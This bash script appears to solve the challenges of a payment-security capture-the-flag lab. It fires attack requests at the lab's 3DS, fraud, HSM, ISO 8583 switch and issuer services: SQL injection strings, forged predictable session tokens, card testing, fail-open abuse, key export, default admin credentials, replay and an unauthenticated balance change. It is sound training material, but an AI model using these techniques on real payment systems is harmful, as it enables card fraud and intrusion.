#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

ctf::need curl jq base64

run_3ds_bypass() {
  ctf::header "3DS_BYPASS - static OTP and threshold bypass"
  ctf::post_json "$ACS_URL/acs/challenge" '{"pan":"4111111111111111","amount":500,"currency":"EUR","merchantName":"TestShop"}' | ctf::json
  ctf::post_json "$ACS_URL/acs/verify-otp" '{"challengeId":"test","otp":"123456"}' | ctf::json
  ctf::post_json "$ACS_URL/acs/risk-check" '{"pan":"4111111111111111","amount":499.99}' | ctf::json
}

run_advanced_fraud() {
  ctf::header "ADVANCED_FRAUD - card testing, split payment, device reuse"
  for suffix in 01 02 03 04 05 06 07 08 09 10; do
    ctf::post_json "$FRAUD_URL/fraud/check" "{\"pan\":\"41111111111111${suffix}\",\"amount\":1,\"merchantId\":\"SHOP001\",\"mcc\":\"5411\"}" >/dev/null
  done
  ctf::post_json "$FRAUD_URL/fraud/check" '{"pan":"4111111111111111","amount":266,"merchantId":"SHOP_A","mcc":"5411"}' | ctf::json
  ctf::post_json "$FRAUD_URL/fraud/check" '{"pan":"4111111111111111","amount":266,"merchantId":"SHOP_B","mcc":"5411"}' | ctf::json
  ctf::post_json "$FRAUD_URL/fraud/check" '{"pan":"4111111111111111","amount":266,"merchantId":"SHOP_C","mcc":"5411"}' | ctf::json
  ctf::post_json "$FRAUD_URL/fraud/check" '{"pan":"4111111111111112","amount":150,"merchantId":"SHOP001","mcc":"5411","deviceFingerprint":"device-x"}' | ctf::json
  ctf::post_json "$FRAUD_URL/fraud/check" '{"pan":"4111111111111113","amount":150,"merchantId":"SHOP001","mcc":"5411","deviceFingerprint":"device-x"}' | ctf::json
  ctf::post_json "$FRAUD_URL/fraud/check" '{"pan":"4111111111111114","amount":150,"merchantId":"SHOP001","mcc":"5411","deviceFingerprint":"device-x"}' | ctf::json
}

run_boss() {
  ctf::header "BOSS - proof-based unlock"
  local boss_code="${BOSS_CODE:-BOSS-001}"
  local proof_flags_csv="${PROOF_FLAGS_CSV:-}"
  local payload
  payload="$(jq -nc --arg code "$boss_code" --arg csv "$proof_flags_csv" '{bossCode:$code, proofFlags:($csv|split(",")|map(select(length>0)))}')"

  if [[ -z "$proof_flags_csv" ]]; then
    echo "[INFO] Set PROOF_FLAGS_CSV to real prerequisite flags to unlock the boss."
    echo "[INFO] Example: PROOF_FLAGS_CSV='PMP{...},PMP{...}' BOSS_CODE='BOSS-001'"
  fi

  ctf::post_json "$API_GATEWAY_URL/api/ctf/boss/verify" "$payload" | ctf::json
}

run_crypto_weakness() {
  ctf::header "CRYPTO_WEAKNESS - predictable session token"
  local first token decoded ts ctr predicted payload
  first="$(ctf::post_json "$API_GATEWAY_URL/auth/session-token" '{}')"
  echo "$first" | ctf::json
  token="$(echo "$first" | jq -r '.token // empty')"
  if [[ -z "$token" ]]; then
    echo "[WARN] No token returned, cannot build prediction payload."
    return 0
  fi

  decoded="$(printf '%s' "$token" | base64 -d 2>/dev/null || true)"
  ts="${decoded%%:*}"
  ctr="${decoded##*:}"

  if [[ -n "$ts" && "$ts" != "$ctr" && "$ctr" =~ ^[0-9]+$ ]]; then
    predicted="$(printf '%s:%s' "$ts" "$((ctr + 1))" | base64 | tr -d '\r\n')"
    payload="$(jq -nc --arg token "$predicted" '{predictedToken:$token}')"
    ctf::post_json "$API_GATEWAY_URL/auth/session-token" "$payload" | ctf::json
  else
    echo "[WARN] Could not decode timestamp/counter pattern from token: $decoded"
  fi
}

run_emv_cloning() {
  ctf::header "EMV_CLONING - fallback, relay and nonce inspection"
  ctf::post_json "$NETWORK_SWITCH_URL/emv/session/start" '{"pan":"4111111111111111","terminalId":"TERM001"}' | ctf::json
  ctf::post_json "$NETWORK_SWITCH_URL/transaction/authorize" '{"pan":"4111111111111111","amount":100,"currency":"978","merchantId":"SHOP001","posEntryMode":"090","track2":"4111111111111111=28122010000012345678"}' | ctf::json
  ctf::post_json "$NETWORK_SWITCH_URL/emv/relay-test" '{"pan":"4111111111111111","relayedApdus":true,"terminalId":"TERM001"}' | ctf::json
  ctf::get_json "$NETWORK_SWITCH_URL/emv/terminal-nonce" | ctf::json
}

run_fraud_cnp() {
  ctf::header "FRAUD_CNP - fail-open and score manipulation"
  ctf::post_json "$FRAUD_URL/fraud/config" '{"simulateFailure":true,"failMode":"open","fallbackDecision":"APPROVE"}' | ctf::json
  ctf::post_json "$FRAUD_URL/fraud/check" '{"pan":"4111111111111111","amount":9999,"country":"NG","mcc":"7995","merchantId":"SHOP001"}' | ctf::json
  ctf::post_json "$FRAUD_URL/fraud/config" '{"simulateFailure":false}' | ctf::json
  ctf::post_json "$FRAUD_URL/fraud/check" '{"pan":"4111111111111111","amount":2000,"country":"FR","mcc":"5411","merchantId":"SHOP001","deviceFingerprint":"known-device","isRecurring":true}' | ctf::json
}

run_hsm_attack() {
  ctf::header "HSM_ATTACK - weak keys, key export and timing checks"
  ctf::get_json "$HSM_URL/hsm/keys" | ctf::json
  ctf::post_json "$HSM_URL/hsm/export-key" '{"keyLabel":"ZPK_001","wrapperKeyLabel":"ZPK_TEST"}' | ctf::json
  ctf::post_json "$HSM_URL/hsm/verify-mac" '{"data":"PAYLOAD","keyLabel":"ZAK_002","mac":"0011223344556677"}' | ctf::json
}

run_iso8583_manipulation() {
  ctf::header "ISO8583_MANIPULATION - exposed routing and amount overflow"
  ctf::get_json "$NETWORK_SWITCH_URL/transaction/bin-table" | ctf::json
  ctf::post_json "$NETWORK_SWITCH_URL/transaction/authorize" '{"pan":"4111111111111111","amount":999999999.99,"currency":"978","merchantId":"SHOP001"}' | ctf::json
}

run_key_management() {
  ctf::header "KEY_MANAGEMENT - backup exposure, shared KEK, weak export"
  ctf::get_json "$HSM_URL/hsm/backup" | ctf::json
  ctf::get_json "$HSM_URL/hsm/terminal-keys" | ctf::json
  ctf::post_json "$HSM_URL/hsm/export-key" '{"keyLabel":"ZPK_001","wrapperKeyLabel":"ZPK_TEST"}' | ctf::json
}

run_mitm() {
  ctf::header "MITM - CVV leakage in responses/logs"
  ctf::post_json "$NETWORK_SWITCH_URL/transaction/authorize" '{"pan":"4111111111111111","amount":100,"cvv":"123","currency":"978","merchantId":"SHOP001"}' | ctf::json
  ctf::get_json "$NETWORK_SWITCH_URL/transaction/recent-logs" | ctf::json
}

run_network_attack() {
  ctf::header "NETWORK_ATTACK - raw ISO injection and no-integrity path"
  ctf::get_json "$NETWORK_SWITCH_URL/transaction/recent-logs" | ctf::json
  ctf::post_json "$NETWORK_SWITCH_URL/transaction/raw-message" '{"mti":"0110","de2":"4111111111111111","de4":"000000010000","de39":"00","de11":"123456","de43":"SHOP'' OR 1=1 --"}' | ctf::json
  ctf::post_json "$NETWORK_SWITCH_URL/transaction/authorize" '{"pan":"4111111111111111","amount":100,"currency":"978","merchantId":"SHOP001","merchantName":"SHOP'' OR 1=1 --"}' | ctf::json
}

run_pin_cracking() {
  ctf::header "PIN_CRACKING - fail-open verification path"
  ctf::post_json "$HSM_URL/hsm/config" '{"simulateDown":true}' | ctf::json
  ctf::post_json "$HSM_URL/pin/verify" '{"pan":"4111111111111111","pinBlock":"0400000000000","zpkLabel":"ZPK_001"}' | ctf::json
  ctf::post_json "$HSM_URL/hsm/config" '{"simulateDown":false}' | ctf::json
  ctf::post_json "$HSM_URL/pin/generate-block" '{"pan":"4111111111111111","pin":"1234"}' | ctf::json
}

run_privilege_escalation() {
  ctf::header "PRIVILEGE_ESCALATION - unauthenticated balance update"
  ctf::get_json "$ISSUER_URL/accounts" | ctf::json
  ctf::put_json "$ISSUER_URL/accounts/ACC001/balance" '{"balance":999999999}' | ctf::json
  ctf::get_json "$ISSUER_URL/accounts/ACC001" | ctf::json
}

run_replay_attack() {
  ctf::header "REPLAY_ATTACK - replay and velocity reset bypass"
  local tx='{"pan":"4111111111111111","amount":100,"currency":"978","merchantId":"SHOP001","posEntryMode":"051"}'
  ctf::post_json "$NETWORK_SWITCH_URL/transaction/authorize" "$tx" | ctf::json
  ctf::post_json "$NETWORK_SWITCH_URL/transaction/authorize" "$tx" | ctf::json

  local fraud='{"pan":"4111111111111111","amount":50,"merchantId":"SHOP001","mcc":"5411"}'
  for _ in 1 2 3 4 5 6; do
    ctf::post_json "$FRAUD_URL/fraud/check" "$fraud" >/dev/null
  done
  ctf::post_json "$FRAUD_URL/fraud/reset" '{}' | ctf::json
  ctf::post_json "$FRAUD_URL/fraud/check" "$fraud" | ctf::json
}

run_supply_chain() {
  ctf::header "SUPPLY_CHAIN - checkout JS, default creds and debug leakage"
  ctf::get_json "$API_GATEWAY_URL/checkout" | head -n 40
  ctf::post_json "$API_GATEWAY_URL/tms/login" '{"username":"admin","password":"admin"}' | ctf::json
  ctf::get_json "$API_GATEWAY_URL/debug" | ctf::json
}

run_token_vault() {
  ctf::header "TOKEN_VAULT - tokenize/detokenize path and algorithm leakage"
  ctf::post_json "$API_GATEWAY_URL/api/tokenization/tokenize" '{"pan":"4111111111111111","merchantId":"SHOP001"}' | ctf::json
  ctf::post_json "$API_GATEWAY_URL/api/tokenization/detokenize" '{"token":"TOK-000001"}' | ctf::json
  ctf::get_json "$API_GATEWAY_URL/api/tokenization/algorithm-info" | ctf::json
}

main() {
  if [[ $# -lt 1 ]]; then
    echo "Usage: $0 <category>"
    echo "Categories: 3ds_bypass advanced_fraud boss crypto_weakness emv_cloning fraud_cnp hsm_attack iso8583_manipulation key_management mitm network_attack pin_cracking privilege_escalation replay_attack supply_chain token_vault"
    exit 1
  fi

  case "$1" in
    3ds_bypass) run_3ds_bypass ;;
    advanced_fraud) run_advanced_fraud ;;
    boss) run_boss ;;
    crypto_weakness) run_crypto_weakness ;;
    emv_cloning) run_emv_cloning ;;
    fraud_cnp) run_fraud_cnp ;;
    hsm_attack) run_hsm_attack ;;
    iso8583_manipulation) run_iso8583_manipulation ;;
    key_management) run_key_management ;;
    mitm) run_mitm ;;
    network_attack) run_network_attack ;;
    pin_cracking) run_pin_cracking ;;
    privilege_escalation) run_privilege_escalation ;;
    replay_attack) run_replay_attack ;;
    supply_chain) run_supply_chain ;;
    token_vault) run_token_vault ;;
    *)
      echo "Unknown category: $1"
      exit 1
      ;;
  esac
}

main "$@"

